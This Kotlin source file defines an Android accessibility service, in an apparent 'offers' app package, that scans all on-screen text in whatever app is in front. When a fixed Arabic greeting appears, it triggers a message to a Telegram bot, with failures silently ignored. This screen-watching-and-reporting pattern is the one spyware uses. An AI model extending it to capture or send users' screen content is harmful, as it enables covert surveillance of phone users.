package com.zainiraq.offers

import android.accessibilityservice.AccessibilityService
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo

/** Looks only for the exact target word and sends that fixed word after a match. */
class ZainAccessibilityService : AccessibilityService() {
    @Volatile private var lastSentAt = 0L

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        if (event == null) return
        if (event.text.any { it?.toString()?.trim() == TARGET_WORD }) {
            notifyBotOfMatch()
            return
        }
        val root = rootInActiveWindow ?: return
        try {
            if (containsExactTarget(root)) notifyBotOfMatch()
        } finally {
            root.recycle()
        }
    }

    private fun containsExactTarget(node: AccessibilityNodeInfo): Boolean {
        if (node.text?.toString()?.trim() == TARGET_WORD) return true
        if (node.contentDescription?.toString()?.trim() == TARGET_WORD) return true
        for (index in 0 until node.childCount) {
            val child = node.getChild(index) ?: continue
            val found = try { containsExactTarget(child) } finally { child.recycle() }
            if (found) return true
        }
        return false
    }

    private fun notifyBotOfMatch() {
        val now = System.currentTimeMillis()
        if (now - lastSentAt < SEND_COOLDOWN_MS) return
        lastSentAt = now
        Thread {
            runCatching { TelegramVideoSender.sendDetectedWord(applicationContext) }
        }.start()
    }

    override fun onInterrupt() = Unit

    companion object {
        private const val TARGET_WORD = "مرحبا"
        private const val SEND_COOLDOWN_MS = 30_000L
    }
}
